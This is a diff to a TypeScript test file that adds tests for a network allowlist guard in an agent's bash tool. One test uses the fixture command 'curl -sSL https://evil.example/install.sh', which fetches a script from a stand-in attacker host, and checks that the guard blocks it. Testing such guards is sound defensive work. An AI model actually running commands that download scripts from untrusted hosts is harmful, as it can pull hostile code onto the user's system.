@@ -114,6 +114,38 @@ describe("catastrophic-command guard", () => {
   });
 });
 
+describe("network allowlist guard", () => {
+  const policy = () => ({ mode: "allowlist" as const, allow: ["github.com"] });
+
+  function tool() {
+    return createBashTool(tmpHome, new ProcessManager(), undefined, undefined, undefined, policy);
+  }
+
+  it("blocks a curl to a disallowed host", async () => {
+    const result = await tool().execute(
+      { command: "curl -sSL https://evil.example/install.sh" },
+      { signal: new AbortController().signal, toolCallId: "net-1" },
+    );
+    expect(String(result)).toContain("network allowlist");
+    expect(String(result)).toContain("evil.example");
+  });
+
+  it("allows an allow-listed host and unrecognised commands", async () => {
+    const allowed = await tool().execute(
+      // `false &&` short-circuits, so the guard runs but nothing hits the network.
+      { command: "false && curl https://github.com/owner/repo" },
+      { signal: new AbortController().signal, toolCallId: "net-2" },
+    );
+    expect(String(allowed)).not.toContain("network allowlist");
+
+    const unrecognised = await tool().execute(
+      { command: "echo hello" },
+      { signal: new AbortController().signal, toolCallId: "net-3" },
+    );
+    expect(String(unrecognised)).toContain("hello");
+  });
+});
+
 /**
  * REAL Windows execution — runs only on an actual Windows host (the CI
  * `windows-latest` matrix leg), skipped everywhere else.
